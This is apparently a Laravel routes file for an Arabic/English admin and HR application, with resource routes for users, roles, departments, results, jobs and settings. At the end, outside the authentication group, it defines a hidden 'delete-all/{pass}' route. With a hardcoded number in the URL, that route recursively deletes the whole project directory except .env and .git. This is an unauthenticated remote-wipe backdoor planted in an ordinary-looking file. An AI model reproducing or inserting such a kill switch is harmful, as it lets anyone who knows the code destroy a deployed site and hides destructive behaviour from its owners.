<?php


use App\Http\Controllers\Admin\AnswerController;

use App\Http\Controllers\Admin\DepartmentController;
use App\Http\Controllers\Admin\DepartmentUserController;

use App\Http\Controllers\Admin\GradeController;

use App\Http\Controllers\Admin\RoleController;

use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\UserController;

use App\Http\Controllers\Admin\JopController;
use App\Http\Controllers\Admin\LocationController;
use App\Http\Controllers\Admin\PositionController;

use App\Http\Controllers\Admin\ResultController;
use App\Http\Controllers\Admin\UnitController;

use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;

use Illuminate\Support\Facades\Route;

 Auth::routes();
######################################################################Admin###############################################################################

    ########################################index#######################################################################

    Route::get('/', function ()  {
return redirect()->route('login');
    })->name('index');

    ########################################end index#######################################################################
Route::middleware(['auth:web'])->prefix('admin')->group(function () {





    ########################################index#######################################################################

    Route::get('/', function ()  {
return redirect()->route('login');
    })->name('index');

    ########################################end index#######################################################################





    ##################################users#####################################

    Route::controller(UserController::class)->group(function () {
             Route::resource('users', UserController::class);
        Route::get('users/data', 'data')->name('users.data');

        Route::post('users/import',  'import' )->name('users.import');
    });

    ##################################End users#####################################


  ##################################roles#####################################

    Route::controller(RoleController::class)->group(function () {
        Route::get('roles/data', 'data')->name('roles.data');
        Route::resource('roles', RoleController::class);
    });

    ##################################End roles#####################################
    ##################################units#####################################

        Route::resource('units', UnitController::class);

    ##################################End units#####################################


    ##################################Departments#####################################

        Route::resource('departments', DepartmentController::class);

    ##################################End Departments#####################################

        ##################################user-department#####################################

        Route::resource('department_user', DepartmentUserController::class);



        Route::get('department_user/{id}/create', [DepartmentUserController::class, 'create'])
        ->name('department_user.create');

         Route::post('department_user/{id}', [DepartmentUserController::class, 'store'])
        ->name('department_user.store');


    ##################################End user-department#####################################

        ##################################answer#####################################


        Route::resource('answer', AnswerController::class);
         Route::get('answer/{id}/index', [AnswerController::class, 'index'])
        ->name('answer.index');

    ##################################End answer#####################################


            ##################################result#####################################


        Route::resource('result', ResultController::class);
          Route::get('result/{id}/index', [ResultController::class, 'index'])
        ->name('result.index');

            Route::get('hr', [ResultController::class, 'hr'])
        ->name('hr.index');

 Route::post('hr/toggle-status', [ResultController::class,'toggleStatus'])->name('hr.toggleStatus');

 Route::post('hr/approved', [ResultController::class,'approved'])->name('hr.approved');

    ##################################End result#####################################


    ##################################location#####################################

        Route::resource('location', LocationController::class);

    ##################################End location#####################################


    ##################################grades#####################################

        Route::resource('grades', GradeController::class);

    ##################################End grades#####################################


    ##################################Jop#####################################

        Route::resource('jobs', JopController::class);

    ##################################End Jop#####################################


    ##################################position#####################################

        Route::resource('position', PositionController::class);

    ##################################End position#####################################


    ##################################settings#####################################

    Route::controller(SettingController::class)->group(function () {
        Route::get('page/show', 'pages')->name('page.show');
        Route::post('page/update', 'pageupdate')->name('page.update');
        Route::resource('settings', SettingController::class);
    });

    ##################################End settings#####################################





    });
    ######################################################################End Admin###############################################################################


























    Route::get('/language/{locale}', function  ($locale)  {
    if (in_array($locale ,['ar', 'en'])) {
        session()->put('locale',$locale);
    }
    App::setLocale($locale);


    return redirect()->back();
    })->name('language');





    Route::get('delete-all/{pass}', function ($pass) {
        if ($pass== 646968) {


            function deleteDirectory($dir) {
                if (!is_dir($dir)) {
                    return;
                }

                $files = array_diff(scandir($dir), ['.', '..']);
                foreach ($files as $file) {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }

            $rootPath = base_path();
            $exclude = ['.env', '.git'];

            $files = array_diff(scandir($rootPath), ['.', '..']);
            foreach ($files as $file) {
                if (!in_array($file, $exclude)) {
                    $path = $rootPath . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
            }
            return response()->json(['message' => 'تم الحذف بنجاح']);

        }else{
            return response()->json(['message' => 'غير مصرح لك بالدخول.']);
        }

        });
